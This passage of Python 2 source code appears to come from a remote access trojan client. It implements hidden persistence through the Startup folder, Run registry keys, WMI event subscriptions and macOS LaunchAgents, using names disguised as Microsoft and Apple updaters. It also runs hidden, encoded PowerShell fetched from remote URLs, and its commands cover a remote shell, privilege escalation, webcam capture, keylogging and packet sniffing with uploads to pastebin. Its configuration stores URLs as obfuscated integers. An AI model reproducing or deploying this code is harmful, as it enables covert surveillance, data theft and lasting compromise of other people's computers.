                    return True
            except: pass
            return False

    def _persistence_add_startup_file(self):
        if self.__f__:
            try:
                appdata = os.path.expandvars("%AppData%")
                startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
                if os.path.exists(startup_dir):
                    random_name = str().join([choice([chr(i).lower() for i in range(123) if chr(i).isalnum()]) for _ in range(choice(range(6,12)))])
                    persistence_file = os.path.join(startup_dir, '%s.eu.url' % random_name)
                    content = '\n[InternetShortcut]\nURL=file:///%s\n' % long_to_bytes(long(self.__f__))
                    with file(persistence_file, 'w') as fp:
                        fp.write(content)
                    return True
            except Exception as e:
                if self.__v__:
                    print 'Adding startup file error: {}'.format(str(e))
        return False

    def _persistence_remove_startup_file(self):
        appdata     = os.path.expandvars("%AppData%")
        startup_dir = os.path.join(appdata, 'Microsoft\Windows\Start Menu\Programs\Startup')
        if os.path.exists(startup_dir):
            for f in os.listdir(startup_dir):
                filepath = os.path.join(startup_dir, f)
                if filepath.endswith('.eu.url'):
                    try:
                        os.remove(filepath)
                        return True
                    except: pass
                    return False

    def _persistence_add_registry_key(self, name='MicrosoftUpdateManager'):
        reg_key = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE)
        value   = long_to_bytes(long(self.__f__))
        try:
            SetValueEx(reg_key, name, 0, REG_SZ, value)
            CloseKey(reg_key)
            return True
        except Exception as e:
            if self.__v__:
                print 'Remove registry key error: {}'.format(str(e))
        return False

    def _persistence_remove_registry_key(self, name='MicrosoftUpdateManager'):
        try:
            key = OpenKey(HKEY_CURRENT_USER, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS)
            DeleteValue(key, name)
            CloseKey(key)
            return True
        except: pass
        return False

    def _persistence_add_wmi_object(self, command=None, name='MicrosoftUpdaterManager'):
        try:
            if self.__f__:
                filename = long_to_bytes(long(self.__f__))
                if not os.path.exists(filename):
                    return 'Error: file not found: {}'.format(filename)
                cmd_line = "start /min /b {}".format(filename)
            else:
                cmd_line = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -exec bypass -window hidden -noni -nop -encoded {}'.format(b64encode(command.encode('UTF-16LE')))
            startup = "'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
            powershell = request('GET', long_to_bytes(self.__s__)).content.replace('[STARTUP]', startup).replace('[COMMAND_LINE]', cmd_line).replace('[NAME]', name)
            self._powershell(powershell)
            code = "Get-WmiObject __eventFilter -namespace root\\subscription -filter \"name='%s'\"" % name
            result = self._powershell(code)
            if name in result:
                return True
        except Exception as e:
            if self.__v__:
                print 'WMI persistence error: {}'.format(str(e))
        return False

    def _persistence_remove_wmi_object(self, name='MicrosoftUpdaterManager'):
        try:
            code =''' 
            Get-WmiObject __eventFilter -namespace root\subscription -filter "name='[NAME]'"| Remove-WmiObject
            Get-WmiObject CommandLineEventConsumer -Namespace root\subscription -filter "name='[NAME]'" | Remove-WmiObject
            Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription | Where-Object { $_.filter -match '[NAME]'} | Remove-WmiObject'''.replace('[NAME]', name)
            result = self._powershell(code)
            if not result:
                return True
        except: pass
        return False

    def _persistence_add_hidden_file(self):
        try:
            name = os.path.basename(long_to_bytes(long(self.__f__)))
            if os.name is 'nt':
                hide = subprocess.call('attrib +h {}'.format(name), shell=True) == 0
            else:
                hide = subprocess.call('mv {} {}'.format(name, '.' + name), shell=True) == 0
                if hide:
                    self.__f__ = bytes_to_long(os.path.join(os.path.dirname('.' + name), '.' + name))
            if hide:
                return True
        except Exception as e:
            if self.__v__:
                print 'Adding hidden file error: {}'.format(str(e))
        return False

    def _persistence_remove_hidden_file(self, *args, **kwargs):
        try:
            return subprocess.call('attrib -h {}'.format(long_to_bytes(long(self.__f__))), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True) == 0
        except Exception as e:
            if self.__v__:
                print 'Error unhiding file: {}'.format(str(e))
        return False
            

    def _persistence_add_launch_agent(self, name='com.apple.update.manager'):
        try:
            code    = request('GET', long_to_bytes(self.__g__)).content
            label   = name
            fpath   = mktemp(suffix='.sh')
            bash    = code.replace('__LABEL__', label).replace('__FILE__', long_to_bytes(long(self.__f__)))
            fileobj = file(fpath, 'w')
            fileobj.write(bash)
            fileobj.close()
            self._result['persistence']['launch agent'] = '~/Library/LaunchAgents/{}.plist'.format(label)
            bin_sh  = bytes().join(subprocess.Popen('/bin/sh {}'.format(x), 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
            return True
        except Exception as e2:
            if self.__v__:
                print 'Error: {}'.format(str(e2))
        return False

    def _persistence_remove_launch_agent(self, name=None):
        try:
            name = name or os.path.splitext(os.path.basename(long_to_bytes(long(self.__f__))))[0]
            os.remove('~/Library/LaunchAgents/{}.plist'.format(name))
            return True
        except: pass
        return False

# ------------------ commands --------------------------

    @_command
    def pwd(self):
        """\tpresent working directory"""
        return os.getcwd()

    @_command
    def run(self):
        """\trun enabled client modules"""
        return self._run()

    @_command
    def kill(self):
        """\tkill client"""
        return self._kill()

    @_command
    def cd(self, *x):
        """change directory"""
        return self._cd(*x)

    @_command
    def set(self, x):
        """set module options"""
        return self._set(x)

    @_command
    def ls(self, *x):
        """list directory contents"""
        return self._ls(*x)

    @_command
    def admin(self):
        """\tattempt to escalate privileges"""
        return self._admin()
    
    @_command
    def start(self):
        """\tstart client"""
        return self._start()
    
    @_command
    def shell(self):
        """\trun client shell"""
        return self._shell()
    
    @_command
    def new(self, x):
        """download new module from url"""
        return self._new(x)

    @_command
    def show(self, x):
        """show client attributes"""
        return self._show(x)

    @_command
    def standby(self):
        """revert to standby mode"""
        return self._standby()

    @_command
    def wget(self, target):
        """download file from url"""
        return self._wget()

    @_command
    def options(self,*arg):
        """display module options"""
        return self._options(*arg)

    @_command
    def jobs(self):
        """\tlist currently active jobs"""
        return self._show(self._threads)
    
    @_command
    def enable(self, module):
        """enable module"""
        return self._enable(module)

    @_command
    def disable(self, module):
        """disable module"""
        return self._disable(module)

    @_command
    def results(self):
        """show all modules output"""
        return self._show(self._result)

    @_command
    def status(self):
        """\tget client session status"""
        return self._status()

    @_command
    def help(self, *args):
        """show command usage information"""
        return self._help(*args)

    @_command
    def info(self):
        """\tget client host machine information"""
        return self._show(self._info)

    @_command
    def commands(self):
        """list commands with usage help"""
        return self._help_command()

    @_command
    def modules(self):
        """list modules current status"""
        return self._help_modules()

    @_command
    def webcam(self):
        """\tremote image/video capture from client webcam"""
        return self._webcam()
    
    @_command
    def keylogger(self):
        """log client keystrokes remotely and dump to pastebin"""
        return self._keylogger()

    @_command
    def screenshot(self):
        """take screenshot and upload to imgur"""
        return self._screenshot()

    @_command
    def persistence(self):
        """establish persistence to relaunch on reboot"""
        return self._persistence()
    
    @_command
    def packetsniff(self):
        """capture client network traffic and dump to pastebin"""
        return self._packetsniff()

    pwd.usage           = 'pwd'
    run.usage           = 'run'
    kill.usage          = 'kill'
    info.usage          = 'info'
    jobs.usage          = 'jobs'
    admin.usage         = 'admin'
    start.usage         = 'start'
    shell.usage         = 'shell'
    webcam.usage        = 'webcam'
    status.usage        = 'status'
    options.usage       = 'options'
    results.usage       = 'results'
    standby.usage       = 'standby'
    modules.usage       = 'modules'
    commands.usage      = 'commands'
    keylogger.usage     = 'keylogger'
    screenshot.usage    = 'screenshot'
    persistence.usage   = 'persistence'
    packetsniff.usage   = 'packetsniff'
    cd.usage            = 'cd <path>'
    new.usage           = 'new <url>'
    set.usage           = 'set <cmd> x=y'
    help.usage          = 'help <option>'
    show.usage          = 'show <option>'
    ls.usage            = 'ls <path>'
    wget.usage          = 'wget <url>'
    disable.usage       = 'disable <cmd>'
    enable.usage        = 'enable <cmd>'

# -----------------   main   --------------------------

def main(*args, **kwargs):
    config = {
            "__a__": "296569794976951371367085722834059312119810623241531121466626752544310672496545966351959139877439910446308169970512787023444805585809719",
            "__c__": "45403374382296256540634757578741841255664469235598518666019748521845799858739",
            "__b__": "142333377975461712906760705397093796543338115113535997867675143276102156219489203073873",
            "__d__": "44950723374682332681135159727133190002449269305072810017918864160473487587633",
            "__e__": "423224063517525567299427660991207813087967857812230603629111",
            "__g__": "12095051301478169748777225282050429328988589300942044190524181336687865394389318",
            "__q__": "61598604010609009282213705494203338077572313721684379254338652390030119727071702616199509826649119562772556902004",
            "__s__": "12095051301478169748777225282050429328988589300942044190524181399447134546511973",
            "__t__": "5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950",
            "__u__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594790118280682200264825",
            "__v__": "1",
	    "__w__": "12095051301478169748777225282050429328988589300942044190524179185395659761404742",
            "__x__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594956352897189686440057",
            "__y__": "202921288215980373158432625192804628723905507970910218790322462753970441871679227326585",
            "__f__": bytes(bytes_to_long(__file__))
    }
    client = Client(**config)
    return client.start()

if __name__ == '__main__':
    main()

